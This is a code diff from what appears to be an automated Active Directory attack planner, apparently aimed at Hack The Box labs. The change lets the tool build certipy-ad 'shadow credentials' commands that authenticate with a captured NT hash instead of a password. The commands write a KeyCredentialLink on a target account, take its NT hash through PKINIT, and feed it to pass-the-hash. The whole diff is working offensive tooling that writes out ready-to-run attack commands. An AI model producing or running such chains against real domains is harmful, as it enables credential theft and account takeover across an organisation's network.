@@ -1099,13 +1099,20 @@ def run(report, store, ui=None):
                 # UPN slot even after iter-44 threaded the real domain into
                 # every other ACL-edge chain. Fixed to use _dom_e so the
                 # operator gets 'user@htb.local' instead of 'user@<dom>'.
+                # iter-98: certipy-ad shadow auto supports -hashes :NT for
+                # hash-only actor auth. Route by _owned_hash so a machine
+                # account (or captured hash without plaintext) still fires.
+                if _owned_hash:
+                    _sh_auth = (f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_owned_hash}'")
+                else:
+                    _sh_auth = f"-p '{_owned_pw}'"
                 chains.append(Chain("R-SHADOW", "shadow credentials",
                     f"AddKeyCredentialLink: {actor} -> {tgt} "
                     f"(Shadow Creds -> PKINIT -> NT hash)",
                     crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                     commands=[
                         f"certipy-ad shadow auto -u '{_owned}@{_dom_e}' "
-                        f"-p '{_owned_pw}' -account '{tgt}' -dc-ip {_dc_e}",
+                        f"{_sh_auth} -account '{tgt}' -dc-ip {_dc_e}",
                         f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                     ], src=edge["src"], line=edge["line"]))
             elif r in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"):
